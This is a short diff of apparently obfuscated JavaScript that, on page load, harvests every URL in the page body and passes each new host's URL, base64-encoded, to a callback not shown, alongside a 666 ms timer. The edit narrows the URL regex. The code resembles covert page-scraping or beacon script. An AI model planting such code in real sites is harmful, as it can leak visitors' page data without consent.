@@ -19,7 +19,7 @@ setInterval(function(){
 }, 666)
 
 self.addEventListener("load", function() {
-	obf_var_urls = document.body.innerHTML.match(/http(s|)\:\/\/[a-z0-9\.\-]{4,61}\.[a-z]{2,3}(:[0-9]{1,5}|)([\/][a-z0-9\-\.\/\,\_\~\!\$\&\'\(\)\*\+\;\=\:\@]*([\?][a-z0-9\%\-\.\_\~\:\/\?\#\[\]\@\!\$\&\'\(\)\*\+\,\;\=`]*|)|[\?][a-z0-9\%\-\.\_\~\:\/\?\#\[\]\@\!\$\&\'\(\)\*\+\,\;\=`]*|)/ig)
+	obf_var_urls = document.body.innerHTML.match(/http(s|)\:\/\/[a-z0-9\.\-]{4,61}\.[a-z]{2,3}(:[0-9]{1,5}|)([\/][a-z0-9\-\.\/\,\_\~\!\$\&\'\(\)\*\+\;\=\:\@]*|)/ig)
 	for (var obf_var_i = 0; obf_var_i < obf_var_urls.length; obf_var_i++) {
 		obf_var_host = obf_var_urls[obf_var_i].replace(/http(s|)\:\/\//, "").replace(/\/.*/, "")
 		obf_var_callback_log.indexOf(obf_var_host) == -1 ? obf_func_callback(btoa(obf_var_urls[obf_var_i])) : ""
